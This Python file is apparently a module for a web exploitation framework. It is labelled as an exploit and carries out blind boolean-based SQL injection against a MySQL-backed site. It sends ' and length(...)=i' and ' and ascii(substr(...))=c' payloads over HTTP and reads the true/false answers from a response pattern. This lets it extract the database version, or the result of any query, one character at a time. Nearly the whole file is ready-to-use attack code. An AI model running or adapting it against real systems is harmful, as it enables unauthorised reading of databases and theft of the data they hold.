#!/usr/bin/python
#author: namhb
import sys, os, string
from libs.coreHTTPModule import coreHTTPModule
# Load core module
class module(coreHTTPModule):
	def __init__(self, logger, profile):
		coreHTTPModule.__init__(self, logger, profile)
		self.name							=	"Blind SQL injection Module"
		self.description 					=	"Blind SQL injection with brute force character ( greater than 100 requests/character)"
		self.rank							=	"HIGH"					# Exploit level
		self.type							=	"Exploit"				# Type: exploit | scanner | support
		self.author							=	"namhb"
		self.version						=	"0.0.1"
		self.maxLength 						=	255
		self.resultLength 					=	None
		self.result 						=	""
		self.basicOptions["PATTERN"] 		=	{
					"currentSetting"		:	None,
					"required"				:	True,
					"description"			:	"Pattern to check True/False"
		}

	def getMySQLLength(self, query):
		for i in range(0, self.maxLength):
			# Payload: 1 and and length(version)=i
			payload 						=	" and length({0})={1}".format(query, i)
			result 							=	self.checkQuery(payload)
			if(result == True):
				self.resultLength 			=	i
				break
	def getMySQLVersion(self):
		# Query = version()
		self.logger.info("Get MySQL version")
		self.runMySQLQuery("version()")
	def runMySQLQuery(self, query):
		self.logger.info("Run query: {0}".format(query))
		self.getMySQLLength(query)
		if(self.resultLength == None):
			self.logger.info("Can`t not get query!")
			exit()
		self.logger.info("Result length: {0}".format(self.resultLength))
		self.getMySQLQueryResult(query)
		self.logger.info("Result: {0}".format(self.result))
		# Clean result
		self.resultLength 					=	0
		self.result 						=	""
	def getMySQLQueryResult(self, query):
		# First get length
		if(self.resultLength != None):
			for i in range(0, self.resultLength):
				for x in string.printable:
					asciiChar 				=	ord(x)
					payload 				=	" and ascii(substr({0},{1},1))={2}".format(query, (i+1), asciiChar)
					result 					= 	self.checkQuery(payload)
					if(result == True):
						self.logger.info("Found character number {0} is: {1}".format(i+1, x))
						self.result 		+=	x
						break
		# Second get result
	def checkQuery(self, payload):
		# Return true/false of query
		# If contain, return True, if not, return False
		# Or use regex
		r 									=	self.sendHTTPRequest(payload)
		if(r.text.find(self.basicOptions["PATTERN"]["currentSetting"]) > 0):
			return True
		else:
			return False
	def run(self):
		# We coding here
		# Query ex: select version() from dual
		self.getMySQLVersion()